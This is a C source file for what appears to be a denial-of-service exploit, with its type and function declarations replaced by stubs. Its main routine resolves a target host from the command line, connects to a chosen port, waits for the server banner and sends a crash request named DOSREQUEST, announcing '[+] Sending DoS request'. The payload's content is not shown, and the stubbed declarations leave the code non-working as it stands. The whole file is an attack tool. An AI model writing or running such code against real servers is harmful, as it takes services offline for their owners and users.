
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int target ;
struct in_addr {int dummy; } ;
struct sockaddr_in {int sin_port; struct in_addr sin_addr; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int recvbuff ;
typedef int WSADATA ;


 int AF_INET ;
 int DOSREQUEST ;
 int IPPROTO_TCP ;
 int SOCK_STREAM ;
 int WSAStartup (int,int *) ;
 int atoi (char*) ;
 int close (int) ;
 scalar_t__ connect (int,struct sockaddr*,int) ;
 int errore (char*) ;
 int fputs (char*,int ) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int ) ;
 scalar_t__ recv (int,char*,int,int ) ;
 scalar_t__ send (int,int ,int ,int ) ;
 int socket (int ,int ,int ) ;
 int stdout ;
 int strlen (int ) ;
 int usage (char*) ;

int main( int argc, char *argv[] )
{
 int sock;
 struct hostent *he;
 struct sockaddr_in target;
 char recvbuff[512];






 if ( argc < 3 ) usage(argv[0]);

 if ( (he = gethostbyname(argv[1])) == ((void*)0) )
  errore("Can't resolve host");

 target.sin_family = AF_INET;
 target.sin_addr = *(( struct in_addr *) he -> h_addr );
 target.sin_port = htons(atoi(argv[2]));

 fputs("[+] Connecting...\n", stdout);

 if ( (sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP )) < 0)
  errore("[-] Can't create socket\n");

 if ( connect(sock, (struct sockaddr *) &target, sizeof(target)) < 0 )
  errore("[-] Can't connect\n");

 if ( recv( sock, recvbuff, sizeof(recvbuff), 0) < 0 )
  errore("[-] Server seems to be down\n");

 fputs("[+] Sending DoS request\n", stdout);

 if ( send( sock, DOSREQUEST, strlen(DOSREQUEST), 0) < 0 )
  errore("[-] Cant' send the request\n");

 fputs("[+] Done\n", stdout);

 close(sock);

 return(0);

}
